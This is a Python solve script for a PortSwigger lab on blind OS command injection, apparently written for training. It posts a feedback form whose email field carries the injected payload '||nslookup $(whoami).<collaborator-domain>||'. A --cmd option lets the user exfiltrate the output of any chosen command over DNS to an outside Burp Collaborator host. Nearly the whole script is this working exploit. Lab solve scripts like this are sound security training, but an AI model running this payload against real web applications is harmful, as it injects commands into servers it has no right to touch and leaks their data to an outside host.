#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Blind OS command injection with out-of-band data exfiltration.

Sends the payload with backtick-wrapped whoami. User provides Collaborator
subdomain; exfiltrated username appears as a subdomain prefix in Collaborator
UI, which the user submits to the lab's solution form.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def grab_csrf(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/feedback")
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def inject(session: requests.Session, lab: str, collab_domain: str, cmd: str = "whoami") -> None:
    csrf = grab_csrf(session, lab)
    payload = f"||nslookup $({cmd}).{collab_domain}||"
    data = {
        "csrf": csrf,
        "name": "x",
        "email": payload,
        "subject": "x",
        "message": "x",
    }
    r = session.post(f"{lab}/feedback/submit", data=data)
    print(f"[*] Feedback submit status: {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve OS Command Injection Lab 5 (blind OAST exfiltration)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument(
        "collab_domain",
        help="Burp Collaborator subdomain (e.g. abc123.oastify.com)",
    )
    parser.add_argument(
        "--cmd", default="whoami", help="Command whose output to exfiltrate (default: whoami)"
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Injecting nslookup $({args.cmd}).{args.collab_domain}")
    inject(s, lab, args.collab_domain, args.cmd)

    print(f"\n[*] Open Burp Collaborator tab → Poll now.")
    print(f"[*] Click the DNS interaction → Description tab.")
    print(f"[*] Full queried domain: <COMMAND-OUTPUT>.{args.collab_domain}")
    print(f"[*] Copy the subdomain prefix (before your Collaborator ID) and submit to the lab's Solution form.")


if __name__ == "__main__":
    main()
